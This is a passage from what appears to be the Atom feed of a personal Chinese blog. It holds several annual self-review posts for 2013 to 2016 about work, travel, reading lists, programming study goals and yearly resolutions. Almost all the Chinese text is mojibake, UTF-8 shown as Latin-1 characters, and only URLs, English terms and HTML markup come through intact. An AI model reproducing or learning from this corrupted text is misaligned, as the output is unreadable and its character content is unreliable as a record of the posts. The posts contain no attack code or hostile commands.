å¿…è¦ï¼Œä¸è¦æ™šç¡ã€‚</p><h3><span id="you">æ¸¸</span></h3><p>2016å¹´æƒ³å»å¾ˆå¤šåœ°æ–¹ï¼Œç„¶è€Œæ€»æ˜¯é”™è¿‡ï¼Œå¹¿å·ï¼Œæ·±åœ³ï¼Œæ­å·ï¼Œä¸Šæµ·ï¼Œä»¥åŠä¸€ç›´ä»¥æ¥çš„è¡¡å±±ï¼Œéƒ½æˆä¸ºäº†ä»Šå¹´çš„é—æ†¾ã€‚å”¯ä¸€çš„åŠªåŠ›æ˜¯å®Œæˆäº†åæœˆè®¡åˆ’è€Œè€½æçš„æ—¥æœ¬ä¹‹è¡Œï¼Œç¬¬ä¸€æ¬¡å‡ºå›½æˆå°±è¾¾æˆã€‚ä½†æ˜¯è®¡åˆ’ä¸è¶³å’Œæ—¥è¯­èƒ½åŠ›ä¹Ÿä½¿å¾—è¿™æ¬¡å‡ºè¡Œæœ‰äº›ä»“ä¿ƒï¼Œæ²¡æœ‰è¾¾åˆ°è‡ªå·±çš„é¢„æœŸã€‚</p><h3><span id="gan-qing">æ„Ÿæƒ…</span></h3><blockquote><p>é€ƒé¿é—®é¢˜å’Œå†·æ¼ å¤„ç†é—®é¢˜éƒ½æ˜¯æ„Ÿæƒ…çš„æ•Œäººã€‚(æ¥è‡ªä¸€ä¸ªäººçš„åæ€)</p></blockquote><p>é€ƒé¿å¯è€»ä¸”æ²¡æœ‰ç”¨ã€‚ç„¶è€Œä¸€ä¸ªäººå´å¯ä»¥åšå¾ˆå¤šäº‹æƒ…è€Œä¸éœ€è¦è¿›è¡Œé¡¾è™‘å¤ªå¤šã€‚</p><h3><span id="she-jiao">ç¤¾äº¤</span></h3><p>æœ‰å¾ˆå¤šçš„æ—¶é—´èŠ±åœ¨äº†åˆ· Twitter ä¸Šï¼Œæ²¡äº‹äº†åˆ·ï¼Œåƒå®Œé¥­åˆ·ï¼Œä¸­åˆåˆ·ï¼Œæ™šä¸Šåˆ·ï¼Œç”šè‡³æœ‰æ—¶èµ°è·¯éƒ½åœ¨åˆ·ã€‚è®¤è¯†äº†ä¸€äº›æ–°æœ‹å‹ï¼Œä½†æ˜¯é™¤äº†æ¸¸æˆå’Œç¤¾äº¤è½¯ä»¶ä¸Šçš„å¯¹è¯ï¼Œæ²¡æœ‰æ›´å¤šæ·±å…¥çš„äº¤æµäº†ã€‚</p><h2><span id="zong-jie-he-ji-hua">æ€»ç»“å’Œè®¡åˆ’</span></h2><h3><span id="zong-jie">æ€»ç»“</span></h3><p><strong>è®¡åˆ’æœ‰ä½™è€Œè¡ŒåŠ¨ä¸è¶³</strong>ï¼Œæ˜¯è¿™ä¸€å¹´çš„æ€»ç»“ã€‚å¾ˆå¤šäº‹æƒ…æœ‰äº†å¼€å§‹ï¼Œä½†æ˜¯æ²¡æœ‰å¾ˆå¥½åœ°åšæŒä¸‹å»</p><h3><span id="2017-nian-de-ji-hua">2017å¹´çš„è®¡åˆ’</span></h3><blockquote><p>æ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚</p></blockquote><p>è¿™æ˜¯ä»¥åçš„æ¯ä¸€å¹´è®¡åˆ’çš„ä¸€ä¸ªå®—æ—¨ï¼šè‡³å°‘è¦åšæŒå¹²å®Œä¸€ä»¶äº‹æƒ…ï¼æ¯å¹´éƒ½æƒ³åšå¾ˆå¤šäº‹æƒ…ï¼Œä½†å¯èƒ½æ²¡æœ‰æ—¶é—´ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ç²¾åŠ›ï¼Œä¸æœŸå¾…é€Ÿæˆï¼Œä½†æ±‚æ¯å¤©éƒ½æœ‰è¿›æ­¥ã€‚</p><p>è¯¦ï¼š</p><ol><li><strong>æ—©ç¡</strong> å¦‚æ— å¿…è¦ï¼Œä¸è®¸æ™šç¡ã€‚å¦‚æœæ²¡æœ‰éè¦ç¬¬äºŒå¤©å®Œæˆçš„äº‹æƒ…ï¼Œä¸è¦æ™šç¡ã€‚ç¡å‰å®Œæˆé˜…è¯»ä»»åŠ¡å³å¯ã€‚</li><li><strong>æ—©èµ·</strong> æ—©èµ·æ˜¯ä¸€ç§ä¹ æƒ¯ï¼ŒåšæŒã€‚æ—©èµ·ä¹‹åå¯ä»¥åšå¦‚ä¸‹äº‹æƒ…ï¼šé™åï¼Œæ€»ç»“å‰ä¸€å¤©å’Œæ´»åŠ¨å’Œåˆ—ä¸¾å½“å¤©çš„ä»»åŠ¡ï¼Œæˆ–è€…æ—©èµ·ç®€å•çš„è¿åŠ¨ã€‚</li><li><strong>æˆ’å’–å•¡</strong> åŸå› å¾ˆç®€å•ï¼Œå’–å•¡å½±å“èŠ‚å¾‹æ§åˆ¶å’Œèƒƒã€‚</li><li><strong>æ¯å¤©é˜…è¯»åŠå°æ—¶</strong> é˜…è¯»æŒ‡é˜…è¯»é™¤äº†æŠ€æœ¯ä¹¦ç±ä»¥å¤–çš„ä¹¦ç±ï¼Œæ¯çœ‹å®Œä¸€æœ¬ä¹¦éƒ½éœ€è¦æ€è€ƒå’Œæ€»ç»“ã€‚</li><li><strong>æ¯å‘¨å†™æ€»ç»“</strong> åŒ…æ‹¬å·¥ä½œæ€»ç»“å’Œéå·¥ä½œæ€»ç»“ã€‚</li><li><strong>æ¯å‘¨ä¸€ç¯‡åšå®¢</strong> æŠ€æœ¯åšå®¢æˆ–è€…å…¶ä»–å†…å®¹åšå®¢ï¼Œä½†æ˜¯æ¯æœˆæŠ€æœ¯åšå®¢æ•°é‡åº”è¯¥è¦å¤šä½™å…¶ä»–åšå®¢æ•°é‡ã€‚æ€»ç»“ä¹Ÿå¥½ï¼Œè®°å½•ä¹Ÿå¥½ï¼Œè¦æœ‰è¾“å‡ºï¼Œæ‰èƒ½è¿›æ­¥ã€‚</li><li><strong>æ¯å¤©æ‹ä¸€å¼ ç…§ç‰‡</strong> ç®€å•ï¼Œä½†æ˜¯åšæŒï¼Œå‘åœ¨ Instagram ä¸Šã€‚</li></ol><p>ç®€ï¼š</p><ol><li>æŠ€æœ¯æˆé•¿ã€‚</li></ol><ul><li>ç½‘ç»œåŸºç¡€çŸ¥è¯†å’Œæ“ä½œç³»ç»ŸçŸ¥è¯†ï¼›</li><li>å…¨æ ˆï¼ˆå¼€å‘ï¼Œè¿ç»´ï¼Œäº§å“ç­‰ï¼‰çŸ¥è¯†æ„å»ºï¼›</li><li>è¯­è¨€ï¼šåŠ¨æ€è¯­è¨€ï¼Œå‡½æ•°è¯­è¨€å’Œå¼ºç±»å‹è¯­è¨€ï¼›</li><li>ç»´æŠ¤å¼€æºé¡¹ç›®ï¼›</li></ul><ol><li>çŸ¥è¯†è®°å½•ï¼Œå½’çº³å’Œæ€»ç»“ï¼šï¼ˆä¹¦ï¼ŒRSS, åšå®¢ç­‰ -&gt; Pocketæš‚å­˜ -&gt; Evernoteè®°å½•å’Œå½’çº³ -&gt; åšæ–‡è¾“å‡ºï¼‰</li><li>åšæŒé”»ç‚¼èº«ä½“ï¼Œåˆç†é¥®é£Ÿã€‚</li><li>å­¦å¥½æ—¥è¯­ã€‚<strong>è¿™æ˜¯ä»Šå¹´è¦åšæŒå®Œæˆçš„ä¸€ä»¶äº‹</strong>ã€‚</li><li>è‹±è¯­ä¸è½ä¸‹ã€‚</li><li>å®Œæˆä¸€æ¬¡æ—…è¡Œï¼Œç™»å±±ã€‚</li><li>å­¦ä¼šç‹¬å¤„ã€‚</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¹´åº¦æ€»ç»“ - 2016å¹´ï¼Œæ˜¯å¿™ç¢Œè€Œæ— çŸ¥çš„ä¸€å¹´
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>å¹´åº¦æ€»ç»“ - æˆ‘çš„2015, åšäº†å¾ˆå¤šäº‹, æ¬ äº†å¾ˆå¤šå€º</title>
    <link href="https://qiwihui.com/qiwihui-blog-5/"/>
    <id>https://qiwihui.com/qiwihui-blog-5/</id>
    <published>2018-10-09T05:19:34.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€å¥è¯æ€»ç»“2015å¹´: åšäº†å¾ˆå¤šäº‹, æ¬ äº†å¾ˆå¤šå€ºã€‚</p><span id="more"></span><h2><span id="2015-nian"><strong>2015å¹´</strong></span></h2><p>å¹´åˆä¸‰æœˆç¦»å¼€äº†æ¯•ä¸šåçš„ç¬¬ä¸€ä»½æ­£å¼å·¥ä½œ, ä¸ƒæœˆåº•åŠ å…¥<a href="http://www.qssec.com">é’æ¾</a>, ä¸­é—´çš„å››ä¸ªæœˆä»è¿·èŒ«ç„¦è™‘, åˆ°å®Œæˆç¬¬ä¸€æ¬¡çŸ¥è¯†æ•´åˆå’Œè¡¥å……, ç®—æ˜¯ä¸€æ¬¡å°çš„é£è·ƒã€‚ åœ¨æ–°å›¢é˜Ÿçš„è¿™åŠå¹´æ˜¯è‡ªå·±èƒ½åŠ›å’ŒçŸ¥è¯†å¢é•¿æœ€å¿«çš„åŠå¹´ã€‚</p><p>æ„Ÿè°¢ä¸€è·¯é™ªä¼´çš„å²©, è®¸å¤šäº‹æƒ…ä¸å†çº ç»“, æ›´æœ‰å‹‡æ°”å»åšä¸€ä»¶äº‹æƒ…ã€‚</p><p>æ•´ç†å’Œè¾“å‡ºçš„ä¸œè¥¿å¤ªå°‘, Evernote å’Œ Pocket ä¸Šè®°å½•çš„æ–‡ç« åŸºæœ¬æœªæœ‰æ•ˆæ•´ç†, åšå®¢è‡ªä¸Šæ¬¡æ›´æ–°å·²æ˜¯åŠå¹´, è¿™ç‚¹éœ€è¦æ”¹è¿›ã€‚</p><p>ä¸ªäººé¡¹ç›®ä¸Š, COMICSé¡¹ç›®, å¾®ä¿¡RSSé¡¹ç›®å’Œè‡ªå·±çš„å…¬ä¼—å·(æˆ‘éƒ½å¿˜äº†å«å•¥äº†)ç›¸ç»§åœæ­¢äº†ç»´æŠ¤/æ›´æ–°ã€‚ å¼€æºé¡¹ç›®åŸºæœ¬ç»´æŒåœ¨é˜…è¯»å’Œ fork åˆ«äººé¡¹ç›®çš„æ°´å¹³ä¸Š, å¯¹å¼€æºé¡¹ç›®çš„è´¡çŒ®ä¸å¤Ÿã€‚è‡ªå·±å¼€å‘å’Œä¿¡æ¯æ”¶é›†çš„æ–¹æ³•å·¥å…·æ²¡æœ‰æ•´ç†ã€‚</p><p>2015å¹´é˜…ä¹¦å¯¥å¯¥, ã€Šä¸‰ä½“ã€‹å’Œã€Šé‡å­ç‰©ç†å²è¯ã€‹æ˜¯ä¸ºæ•°ä¸å¤šçš„èƒ½è®°ä½çš„, å€’æ˜¯çŸ¥ä¹ä¸Šè¿„ä»Š645ä¸‡å­—çš„é˜…è¯»é‡ç¡®å®ä»¤æˆ‘å’‹èˆŒ, è¯»ä¹¦çš„è´¨å’Œé‡éƒ½æœ‰å¾…æé«˜ã€‚</p><p>è¯­è¨€èƒ½åŠ›ä¸Š, è‹±è¯­ç»§ç»­ä¿æŒä¹‹å‰çš„å­¦ä¹ é‡, åªæ˜¯æ„è¯­åˆšå¼€å§‹æ²¡å¤šä¹…å°±æ”¾å¼ƒäº†ã€‚</p><p>æ¯å¹´éƒ½ä¼šå­¦ä¸€é¡¹ä¸ä¸€æ ·çš„æŠ€èƒ½æˆ–è€…æŒ‘æˆ˜ä¸€ä»¶ä¸ä¸€æ ·çš„äº‹æƒ…, 2015å¹´ä¸€ä¸ªäººèƒŒåŒ…æ—…è¡Œäº†ä¸€ä¸ªæœˆ, è§è¯†äº†æ±Ÿå—çš„é£æ™¯, æ–°å¢çš„æŠ€èƒ½å°±ç®—æ»‘é›ªäº†ã€‚ç›¸è¾ƒäºä¹‹å‰, 2015å¹´çš„æŠ€èƒ½æˆé•¿æ¯”è¾ƒç¼“æ…¢ã€‚</p><p>2015å¹´åŠå£®åŠèƒ–å¾—é•¿äº†åæ–¤, ä½“é‡è¾¾åˆ°äº†å†å²æœ€é«˜ç‚¹, è¿™æ˜¯ä¸€æ®µæ—¶é—´å¤±è¡¡ä¸è°ƒæ•´çš„ç»“æœã€‚ 2016å¹´éœ€è¦åœæ­¢å¢é•¿, å¢åŠ ä½“èƒ½å’ŒåŠ›é‡è®­ç»ƒã€‚</p><h2><span id="2016-nian-mu-biao"><strong>2016å¹´ç›®æ ‡</strong></span></h2><h3><span id="ge-ren-neng-li-cheng-chang-shang">ä¸ªäººèƒ½åŠ›æˆé•¿ä¸Š:</span></h3><ul><li>ç¼–ç¨‹èƒ½åŠ›ä¸Š, Python/Django ç¼–ç¨‹èƒ½åŠ›åŠ å¼º, æ·±å…¥ç†è§£ä»£ç è¿è¡Œçš„åº•å±‚æœºåˆ¶;</li><li>è®¡ç®—æœºåŸºç¡€çŸ¥è¯†çš„è¡¥è¶³, ä¸»è¦æ˜¯ç½‘ç»œçŸ¥è¯†å’Œæ•°æ®ç»“æ„, ç®—æ³•çŸ¥è¯†ç­‰;</li><li>å‰ç«¯èƒ½åŠ›ä»¥åŠäº§å“åŒ–èƒ½åŠ›;</li><li>ç³»ç»ŸåŒ–çŸ¥è¯†çš„å­¦ä¹ æ–¹æ³•å’Œæ¡†æ¶, å¢åŠ æ•´ç†å’Œè¾“å‡º;</li><li>åˆ©ç”¨è‡ªå·±æŒæ¡çš„èµ„æº, å»ºç«‹ä¿¡æ¯æ”¶é›†å’Œæ•´åˆé¡¹ç›®, æ‰“é€ è‡ªå·±çš„å·¥å…·ã€‚</li></ul><h3><span id="sheng-huo-shang">ç”Ÿæ´»ä¸Š</span></h3><ul><li>ä¸€ä¸¤é¡¹æ–°çš„æŠ€èƒ½, ä¸€é¡¹è‡ªæˆ‘æŒ‘æˆ˜, ä¸€å¼ å…±åŒçš„æ„¿æœ›æ¸…å•;</li><li>ä¹è§‚ä¸€äº›, ç®€å•ä¸€äº›ã€‚</li></ul><p>2015å¹´æ˜¯å˜é©ä¸å˜åŒ–, æœºé‡å’ŒæŒ‘æˆ˜ã€‚æ–°çš„ä¸€å¹´, æ–°çš„æˆé•¿, æ–°çš„å¥‹æ–—, ä¸å˜çš„æ¢¦æƒ³!</p><h2><span id="fu-lu-yi-xia-dou-bi-de-guo-qu"><strong>é™„å½•ä¸€ä¸‹é€—æ¯”çš„è¿‡å»</strong>:</span></h2><ul><li><a href="/posts/3">å¹´åº¦æ€»ç»“ - 2014å¹´çš„ç‚¹ç‚¹æ»´æ»´</a></li><li><a href="/posts/4">å¹´åº¦æ€»ç»“ - è¿‡å»çš„2013å¹´</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¹´åº¦æ€»ç»“ - æˆ‘çš„2015, åšäº†å¾ˆå¤šäº‹, æ¬ äº†å¾ˆå¤šå€º
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>å¹´åº¦æ€»ç»“ - 2014å¹´çš„ç‚¹ç‚¹æ»´æ»´</title>
    <link href="https://qiwihui.com/qiwihui-blog-4/"/>
    <id>https://qiwihui.com/qiwihui-blog-4/</id>
    <published>2018-10-09T05:17:15.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨2014å¹´è¿˜æœ‰15å¤©å°±ç»“æŸçš„æ—¶å€™ï¼Œæ€»ç»“ä¸€ä¸‹è‡ªå·±åœ¨2014å¹´çš„å·¥ä½œç”Ÿæ´»å’Œå­¦ä¹ ã€‚2014å¹´çš„æ•…äº‹æ¯”2013å¹´å°‘ï¼Œä½†æ˜¯çç¢çš„å­¦ä¹ é¡¹ç›®å’Œæ•´ç†å¤šäº†å¾ˆå¤šã€‚</p><span id="more"></span><p>** å­¦ä¹ ç¯å¢ƒ **</p><ul><li>feedly: rssèšåˆé˜…è¯»</li><li>Evernote: åšç¬”è®°</li><li>Pocket: ç¨åé˜…è¯»</li><li>Trello: é¡¹ç›®ç®¡ç†</li><li>blog: çŸ¥è¯†æ•´ç†å’Œåˆ›é€ </li><li>åŸºæœ¬å®ç°Windows, Ubuntu, Android, Mac, iOSå¹³å°ä¹‹é—´æ•°æ®åŒæ­¥</li></ul><p>** Linux **</p><ul><li>bashè„šæœ¬åˆæ­¥</li><li>Arch Linuxå®‰è£…å’ŒåŸºæœ¬é…ç½®</li><li>Raspberry Pi: LAMP</li><li>gunicornä½¿ç”¨</li><li>nginxå…¥é—¨</li></ul><p>** Vim + Git **</p><ul><li>ä½¿ç”¨YCM</li><li>dotfile(e.g. .vimrc, â€¦)å¤‡ä»½ä»¥åŠå·¥ä½œç¯å¢ƒå¿«é€Ÿé…ç½®</li><li>gitä»¥åŠgithubå¸¸ç”¨åŸºç¡€åŠŸèƒ½</li></ul><p>** C **</p><ul><li>2048 in C (å…¶å®æ²¡å®Œæˆ)</li><li>PDT(a tiny card game demo) in C</li></ul><p>** Python **</p><ul><li>PDT in python</li><li>åˆå­¦Django</li><li>Virtualenvè™šæ‹Ÿpythonç¯å¢ƒ</li><li>pip</li></ul><p>** Web **</p><ul><li>ä½¿ç”¨Jekyll</li><li>github pages</li><li>åšå®¢é‡‡ç”¨Markdown</li><li>Html5 + CSS3åŸºç¡€</li><li>OAuth 2.0</li><li>å…¨å¹³å°Cross the Great Firewall</li><li>Tor</li><li>ç½‘ç»œåŸºç¡€</li></ul><p>** Mac/iOS **</p><ul><li>Swiftè¯­è¨€å…¥é—¨</li><li>AFNetworkingæ¡†æ¶</li><li>ShanbayWords.app Demo</li><li>SwiftWeather.app Demo</li><li>iOS Frameworksæ¦‚è§ˆ</li><li>cocoapodsç®¡ç†ç±»åº“</li><li>Html5 webç¦»çº¿app</li></ul><p>** è¯»ä¹¦ **</p><ul><li>ã€Šå¼€æºä¸–ç•Œæ—…è¡Œæ‰‹å†Œã€‹</li><li><em>Dive into Python3</em></li><li><em>Getting started with OAuth 2.0</em></li><li><em>Getting Real</em></li><li>ã€Šé»‘å®¢ä¸ç”»å®¶ã€‹</li><li>ã€Šç®—æ³•æ¦‚è®ºã€‹ï¼ˆ* Algorithms *ï¼ŒPDVï¼‰</li><li>ã€Šä¸€ä¸ªé™Œç”Ÿå¥³äººçš„æ¥ä¿¡ã€‹</li><li>ã€Šé¥¥é¥¿æ¸¸æˆã€‹ï¼ˆI, II,IIIï¼‰</li><li>â€¦</li></ul><p>** è®¾å¤‡ **</p><ul><li>2014å¹´æ–°å…¥4å°è®¾å¤‡ï¼šï¼ˆç•¥ï¼‰ã€‚</li></ul><p>** ç”Ÿæ´» **</p><ul><li>å…­æœˆåˆå»äº†åŒ—æˆ´æ²³ï¼Œç„¶åæ˜¯æ³°å±±ï¼Œä¸ƒæœˆåµ©å±±ï¼Œæ’å±±å’Œä¹æœˆè¥¿å®‰ã€åå±±ã€‚</li><li>Color Run</li><li>åº†å¹¸åªå‘çƒ§äº†ä¸¤å¤©ï¼Œç»§ç»­ä¿æŒã€‚</li></ul><p>ä»¥ä¸Šå°±åƒåˆ—å®¶å¸¸ä¸€æ ·æŠŠ2014å¹´èƒ½è®°å¾—çš„ä¸œè¥¿éƒ½å†™äº†ä¸ªéï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼ŒæŒ–æ˜æœºâ€¦ä¸ï¼š</p><ol><li>å¾ˆå¤šäº‹æƒ…ä¸èƒ½åŠæ—¶è®°å½•ï¼šæ‰€æœ‰çš„äº‹æƒ…æ›´åƒæ˜¯äº”æœˆä»½ä¹‹ååšçš„ï¼Œäº”æœˆä¹‹å‰çš„åŸºæœ¬æ²¡è®°ä½ã€‚</li><li>æ—¶é—´èŠ±é”€è®°å½•ä¸æ¸…æ¥šï¼šæ€»æ„Ÿè§‰äº‹æƒ…å¤šï¼Œä½†æ˜¯å´ä¸çŸ¥é“æ—¶é—´ç”¨åˆ°å“ªè¾¹å»äº†ã€‚</li><li>çœ‹çš„ä¹¦å¤ªå°‘ï¼šæ²¡æœ‰2013å¹´å¤šï¼Œæˆç³»ç»Ÿçš„ä¹¦å°‘ï¼ŒéæŠ€æœ¯ä¹¦ç±»å°‘ï¼Œ2014å¹´ä¸»è¦å€¾å‘äºå¼€å‘æ–‡æ¡£å’Œç¢ç‰‡åŒ–çš„æ–‡ç« ï¼Œå¯¹çŸ¥è¯†å’Œè®¤è¯†çš„ç³»ç»ŸåŒ–è´¡çŒ®å°‘ã€‚</li></ol><p>å› æ­¤2015å¹´åœ¨è¿™å†™æ–¹é¢ç¡®å®è¦æ”¹å–„å’ŒåŠ å¼ºã€‚æ•…åˆ¶å®š2015å¹´çš„ä¸»è¦ç›®æ ‡å¦‚ä¸‹ï¼ˆæ¯”è¾ƒå®½çš„ç›®æ ‡ï¼Œæ— å…ˆåï¼Œè¦ç»†åˆ†ï¼‰ï¼š</p><ol><li><p>è§„åˆ’ï¼š</p><ul><li>æ¯å‘¨æœ‰å°ç»“ï¼Œä¸‰æœˆä¸€æ¬¡ä¹¦é¢è®°å½•å’Œæ€»ç»“</li><li>æ—¥å¸¸æ—¶é—´èŠ±é”€è®°å½•ï¼ˆe.g. RescueTimeï¼‰</li><li>å­¦ä¼šè®°è´¦</li><li>é™åå’Œå†¥æƒ³ï¼ˆè°ç”¨è°çŸ¥é“ï¼ï¼‰</li><li>è¯»ä¹¦ä»¥åŠè¯»ä¹¦ç¬”è®°ï¼Œé”»ç‚¼ -&gt; 100æ—¥è¡ŒåŠ¨</li></ul></li><li><p>å­¦ä¹ ï¼š</p><ul><li>Python: å¸¸è§æ ‡å‡†åº“çš„äº†è§£å’Œé‡ç‚¹å­¦ä¹ </li><li>Swift: GUIåŸºæœ¬è®¾è®¡ï¼ŒCocoa Touch layeråŸºæœ¬</li><li>ç½‘ç»œåŸºç¡€</li><li>ç®—æ³•å’Œæ•°æ®ç»“æ„ï¼šåŸºæœ¬ç®—æ³•å’Œæ•°æ®ç»“æ„çš„ç†è§£å’ŒæŒæ¡</li><li>æ•°å­¦çŸ¥è¯†çš„å›é¡¾å’ŒåŠ å¼º</li><li>è‹±è¯­åŠ å¼ºï¼Œæ‰˜ç¦</li></ul></li><li><p>æ‚é¡¹</p><ul><li>ç»§ç»­æœªå®Œæˆçš„æ—…è¡Œï¼šè¡¡å±±ï¼Œä»¥åŠé’æµ·ã€‚</li></ul></li></ol><p>2015å¹´æƒ³æ¥äº‹æƒ…ä¹Ÿæ˜¯æ¯”è¾ƒå¤šçš„ï¼ŒåŠ æ²¹ï¼</p><p>Wait, wait! è™½ç„¶2015å¹´è¿˜æœ‰15å¤©åˆ°æ¥ï¼Œä½†æ˜¯å¯ä»¥åšçš„äº‹æƒ…è¿˜æ˜¯å¾ˆå¤šï¼Œå¥½å¥½æƒ³æƒ³ï¼ŒandæœŸå¾…æƒŠå–œçš„å‘ç”Ÿï¼</p><p>P.S. æ˜å¹´æ€»ç»“çš„æ—¶å€™è¿™ä¸ªä¹Ÿä¼šæ˜¯æ¯”è¾ƒäºŒçš„ä¸€ç¯‡ï¼Œé™¤éæˆ‘æ²¡æœ‰è¿›æ­¥ï¼</p><p>2013å¹´çš„æ€»ç»“ï¼š<a href="/posts/3">å¹´åº¦æ€»ç»“ - è¿‡å»çš„2013å¹´</a>ã€‚çªç„¶è§‰å¾—è¿™ä¸ªå¥½çŸ«æƒ…å•Š!!</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¹´åº¦æ€»ç»“ - 2014å¹´çš„ç‚¹ç‚¹æ»´æ»´
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>å¹´åº¦æ€»ç»“ - è¿‡å»çš„2013å¹´</title>
    <link href="https://qiwihui.com/qiwihui-blog-3/"/>
    <id>https://qiwihui.com/qiwihui-blog-3/</id>
    <published>2018-10-09T05:15:15.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å†™åœ¨2013å¹´åˆ°2014å¹´è¿˜æœ‰ä¸åˆ°ä¸€ä¸ªæœˆçš„æ—¶å€™, å¯¹æˆ‘ç¬¬ä¸€å¹´å·¥ä½œçš„çŠ¶æ€æœ‰ä¸€ä¸ªç®€å•çš„æè¿°, æ¯å¹´éƒ½è¦ç»™è‡ªå·±å†™ä¸€ä¸ªå¹´ç»ˆæ€»ç»“ã€‚</p><span id="more"></span><h3><span id="de">å¾—</span></h3><ul><li>é€‰æ‹©äº†å’Œæœ‰å…±åŒç›®æ ‡çš„å›¢é˜Ÿä¸€èµ·è°ƒç ”ï¼Œå¥‹æ–—çš„æ„Ÿè§‰çœŸå¥½ã€‚</li><li>é€‰æ‹©äº†è¯·å‡å†™è®ºæ–‡ï¼Œè¿™æ ·æˆ‘å¯ä»¥å­¦éœ¸ä¸€æ¬¡ã€‚</li><li>é€‰æ‹©äº†æ¯•ä¸šå‘å–œæ¬¢çš„å¥³ç”Ÿè¡¨ç™½ï¼Œä¸æƒ³å½¼æ­¤é”™è¿‡ï¼Œè™½ç„¶å¾ˆçŸ­æš‚ã€‚</li><li>é€‰æ‹©äº†æ¯•ä¸šå·¥ä½œï¼Œæ”¾å¼ƒä¿ç ”ï¼Œä¸å»è€ƒå…¬åŠ¡å‘˜ï¼Œæˆ‘ä¸åæ‚”è‡ªå·±çš„é€‰æ‹©ï¼Œè¿™ä¼šæ˜¯ä¸€æ¬¡milestoneã€‚</li><li>é€‰æ‹©äº†åœ¨å…¬å¸é™„è¿‘ç§Ÿæˆ¿ï¼Œè™½ç„¶æœ‰äº›è´µï¼Œä½†æ˜¯ä¸ç”¨æŒ¤ä¸‰å°æ—¶åœ°é“ã€‚</li><li>é€‰æ‹©äº†æ‰‡è´ï¼Œæ”¶è·äº†ä¸€ç§å­¦ä¹ ä¹ æƒ¯ã€‚</li><li>é€‰æ‹©äº†å†™åšå®¢ï¼Œ<a href="http://xn--Daozhang-sc0mo0ce80a4gy33j.info">å»ºä¸ªäººåšå®¢Daozhang.info</a>ï¼Œå†™BUCTMLç½‘ç«™(inBuilding)ï¼Œè™½ç„¶è¿˜åœ¨æ„å»ºä¸­ã€‚</li><li>é€‰æ‹©äº†è´¡çŒ®å¼€æºé¡¹ç›®<a href="https://github.com/qiwihui">@github</a>ï¼Œå› ä¸ºæˆ‘å¼€å§‹è®¨åŒå°é—­çš„Wç³»ç»Ÿã€‚</li><li>ç°åœ¨æ¯å¤©éƒ½è¦çœ‹å‡ é¡µä¹¦ï¼Œè™½ç„¶å°‘ï¼Œä½†ç§¯ç´¯çš„åŠ›é‡å¾ˆææ€–ï¼Œä¸çœ‹ä¸çˆ½è¯´ã€‚</li><li>æˆ‘å–œæ¬¢åƒå·§å…‹åŠ›ï¼Œè€Œä¸”æ˜¯é»‘å·§å…‹åŠ›ã€‚</li><li>é€‰æ‹©äº†å­¦è½®æ»‘ï¼Œè€è´è¶åˆ€ï¼Œå› ä¸ºæˆ‘å–œæ¬¢ã€‚</li><li>é€‰æ‹©äº†ç»™è‡ªå·±ä¸€ä¸ªKeepStudyingæ¢¦ï¼Œæˆ‘ä¼šä¸ºä¹‹è€ŒåŠªåŠ›ï¼å¤šè°¢è€å§çš„æ³¼çƒ­æ°´æ”¯æŒã€‚</li><li>æ„Ÿè°¢ä¸€è·¯ç›¸ä¼´çš„å¤§å­¦ç«¥é‹ï¼Œå››å¹´çš„æ„Ÿè§‰çœŸå¥½ï¼Œé‡é€¢å¿…æœ‰æ—¶ï¼</li><li>å·¥ä½œå›¢é˜Ÿå¾ˆå–œæ¬¢ï¼Œå“ˆå“ˆï¼</li></ul><h3><span id="shi">å¤±</span></h3><ul><li>å› ä¸ºç”Ÿç—…ï¼Œé”™è¿‡äº†ç­çº§çš„æ¯•ä¸šæ—…è¡Œï¼Œå†ä¹Ÿæ²¡æœ‰äº†ã€‚</li><li>ä»Šå¹´æ²¡æœ‰å»å®æ³¢ï¼Œåªèƒ½ç­‰åˆ°æ˜å¹´äº†ï¼Œæˆ‘ä¸æ˜¯æ‹–å»¶ç—‡ã€‚</li><li><a href="https://www.facebook.com/weihui.qiu">Facebook</a>, <a href="https://twitter.com/QiuWeihui1">Twitter</a>, <a href="https://plus.google.com/+WeihuiQiu/">G+</a>, QQ, Wechatâ€¦åˆ†æ•£äº†æˆ‘çš„ç²¾åŠ›ï¼Œæœ‰ç¤¾äº¤ä¾èµ–äº†ã€‚</li><li>æ²¡èƒ½æŠŠGoogle Glassçš„è´­ä¹°ç é€å‡ºå»ï¼Œäººå“ã€‚</li><li>æˆ‘ä¸æƒ³æ‰¯åˆ°å…³äºä¹°æˆ¿ä¹°è½¦çš„é—®é¢˜ã€‚</li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¹´åº¦æ€»ç»“ - è¿‡å»çš„2013å¹´
    
    </summary>
    
